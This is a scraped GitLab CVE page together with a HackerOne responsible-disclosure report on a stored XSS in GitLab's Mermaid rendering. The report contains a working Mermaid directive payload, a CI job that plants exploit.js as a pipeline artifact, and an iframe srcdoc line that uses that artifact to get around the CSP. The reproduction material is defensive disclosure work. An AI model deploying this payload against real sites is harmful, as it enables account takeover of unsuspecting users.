```mermaid
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
flowchart
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
```

=== Content from gitlab.com_45ca8043_20250114_234937.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-22242.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-22242.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-22242.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-22242.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [](/gitlab-bot)

  Aug 23, 2021

  [c281ec1f](/gitlab-org/cves/-/commit/c281ec1f359e4ee580b9729f98a211f28a30f44a)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/c281ec1f359e4ee580b9729f98a211f28a30f44a)
  ·
  c281ec1f

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Aug 23, 2021

  c281ec1f

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/c281ec1f359e4ee580b9729f98a211f28a30f44a)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Aug 23, 2021

Loading


=== Content from gitlab.com_a1915ee0_20250114_234939.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS in Mermaid when viewing Markdown files

**[HackerOne report #1212822](https://hackerone.com/reports/1212822)** by `saleemrashid` on 2021-05-30, assigned to GitLab Team:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

GitLab's Mermaid configuration allows an attacker to inject HTML in the rendered Markdown. This can be combined with a CSP bypass using pipeline artifacts to achieve RCE.

##### Steps to reproduce

1. Create a repository on GitLab.com
2. Add the following to `.gitlab-ci.yml`

```
---
job:
  script:
  - "echo 'alert(parent.document.querySelector(\"meta[name=csrf-token]\").outerHTML)' > exploit.js"
  artifacts:
    paths:
    - exploit.js
```

3. Wait for the pipeline to finish and record the job ID
4. Add the following to `README.md`, changing the project name (`saleemrashid/mermaid-exploit-7032e404`) and job ID (`1303935016`) accordingly

```

```

5. Open `README.md` (or any page that renders it, including the project overview page), and observe the alert containing the CSRF token (e.g. `<meta name="csrf-token" content="XXXXXX">`) caused by executing `exploit.js`

##### Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

##### Examples

Private project on GitLab.com <https://gitlab.com/saleemrashid/mermaid-exploit-7032e404>

##### What is the current *bug* behavior?

Mermaid supports HTML labels when `flowchart.htmlLabels` is enabled and `securityLevel` is not `strict`. GitLab's configuration disables this functionality <https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52>

```
  mermaid.initialize({
    // mermaid core options
    mermaid: {
      startOnLoad: false,
    },
    // mermaidAPI options
    theme,
    flowchart: {
      useMaxWidth: true,
      htmlLabels: false,
    },
    securityLevel: 'strict',
  });
```

However, Mermaid also supports directives (<https://mermaid-js.github.io/mermaid/#/directives>) to alter the configuration. For security reasons, these directives aren't able to override certain configuration options <https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120>

```
  /**
   * This option controls which currentConfig keys are considered _secure_ and can only be changed via
   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to
   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from
   * overriding a site's default security.
   */
  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],
```

While you can't override `securityLevel`, it turns out that overriding `flowchart.htmlLabels` to `"false"` (specifically the string, not the boolean) is sufficient to bypass the sanitization <https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54>

```
  let htmlLabels = true;
  if (
    config.flowchart &&
    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')
  ) {
    htmlLabels = false;
  }

  if (htmlLabels) {
    const level = config.securityLevel;

    if (level === 'antiscript') {
      txt = removeScript(txt);
    } else if (level !== 'loose') {
      // eslint-disable-line
      txt = breakToPlaceholder(txt);
      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');
      txt = txt.replace(/=/g, '&equals;');
      txt = placeholderToBreak(txt);
    }
  }
```

The above code will not sanitize the label if `flowchart.htmlLabels` is set to `false` or `"false"`. It seems like the intention is to not sanitize the label if it's going to be rendered as text, which makes sense. However, the code that actually decides whether to render it as HTML or text always uses `if (config.flowchart.htmlLabels)`, which would succeed for the string `"false"` (because it's truthy). This means the sanitization is bypassed, but the string is still rendered as HTML, resulting in XSS.

To make use of the XSS, we need to bypass the CSP:

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>'
```

Using nonces causes the browser to ignore `'unsafe-inline'`, so we can't use inline scripts. However, we can take advantage of the fact that Workhorse will serve pipeline artifacts with an auto-detected `Content-Type` based on the file extension <https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101>

```
	// Write http headers about the file
	headers.Set("Content-Length", contentLength)
	headers.Set("Content-Type", detectFileContentType(fileName))
	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")
```

The `Content-Disposition` header prevents this from being used for HTML/SVG-based XSS, but it still allows pipeline artifacts to be used as scripts or stylesheets. Because they are on the same domain, they satisfy `'self'` in the CSP policy.

Finally, RCE can be achieved by using the XSS to inject the following HTML, executing a pipeline artifact as JavaScript (`<iframe srcdoc>` is used because you can't directly inject a `<script>` tag with `innerHTML`). This example refers to an artifact on a private repository to maintain responsible disclosure, but you would enable public pipelines for an actual exploit (or add an access token to the URL) so the artifact is accessible by any user.

```
<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
```

##### What is the expected *correct* behavior?

Mermaid should not allow HTML injection. While configuration changes and upstream bugfixes could improve the situation, it might be prudent to move Mermaid into a sandboxed `iframe` to avoid future vulnerabilities. For example, it also supports specifying `themeCSS` (which I attempted to use for a CSS exfiltration attack, but it wasn't practical to exfiltrate more than a few characters because the CSP didn't allow to `[@]import` files from an external server).

Additionally, Workhorse serving artifacts with dangerous `Content-Type` headers might not be secure behavior because it allows to bypass the CSP.

##### Output of checks

This bug happens on GitLab.com

#### Impact

Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [csrf.png](https://h1.sec.gitlab.net/a/d0deece4-c56b-4862-af48-9de537d42e8d/csrf.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


